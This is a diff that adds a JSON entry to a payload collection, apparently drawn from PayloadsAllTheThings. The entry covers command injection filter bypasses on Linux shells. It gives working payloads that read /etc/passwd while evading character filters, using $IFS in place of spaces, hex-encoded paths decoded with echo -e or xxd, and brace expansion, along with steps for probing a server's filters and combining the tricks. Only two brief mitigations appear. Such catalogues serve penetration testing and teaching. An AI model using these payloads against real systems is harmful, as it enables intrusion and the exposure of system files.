@@ -1,0 +1,61 @@
+{
+  "id": "payload_000020",
+  "important": {
+    "title": "Command Injection - Filter Bypasses",
+    "category": "Web Vulnerabilities",
+    "sub_category": "Filter Bypasses",
+    "tags": ["bypass","$IFS","brace-expansion","hex","nulls","obfuscation"],
+    "targets": { "os": ["Linux","Unix"], "system": ["Shell"] },
+    "risk": "high"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Linux"], "system": ["Shell"] },
+      "payload": {
+        "explanation": "Use $IFS or ${IFS} to act as spaces when literal spaces are filtered.",
+        "code": "cat${IFS}/etc/passwd",
+        "run_context": "Shell contexts where $IFS expands to whitespace.",
+        "placeholders": { "FILE": "/etc/passwd" },
+        "notes": "Also try brace expansion, tabs (%09), and backslash-newline splits."
+      }
+    },
+    {
+      "match": { "os": ["Linux"], "system": ["Shell"] },
+      "payload": {
+        "explanation": "Use hex or xxd/echo -e to build strings when characters are filtered.",
+        "code": "echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\" | xargs cat",
+        "run_context": "Shell where echo -e and xxd are available.",
+        "placeholders": {},
+        "notes": "Test multiple encodings and command substitution tricks."
+      }
+    },
+    {
+      "match": { "os": ["Any"], "system": ["Shell"] },
+      "payload": {
+        "explanation": "Use brace expansion to avoid forbidden separators.",
+        "code": "cat{/etc/passwd,}",
+        "run_context": "Bash with brace expansion support.",
+        "placeholders": {},
+        "notes": "Behavior varies by shell; try different expansions."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "Enumerate filters applied by the server (blocked chars, blocked sequences).",
+      "Try $IFS, tabs, backslash-newline, brace expansion, and hex encodings.",
+      "Combine obfuscation techniques if one alone fails."
+    ],
+    "tools": ["Burp Suite", "shell (bash)"],
+    "code_samples": [
+      { "title": "$IFS bypass", "description": "Use IFS as space", "code": "cat${IFS}/etc/passwd", "run_context": "bash" },
+      { "title": "Hex encode path", "description": "Construct path via hex decode", "code": "xxd -r -p <<< 2f6574632f706173737764 | xargs cat", "run_context": "bash" }
+    ],
+    "mitigations": [
+      "Reject or canonicalize unusual encodings before passing to shell.",
+      "Use strict whitelists and avoid shelling out."
+    ],
+    "references": []
+  },
+  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
+}
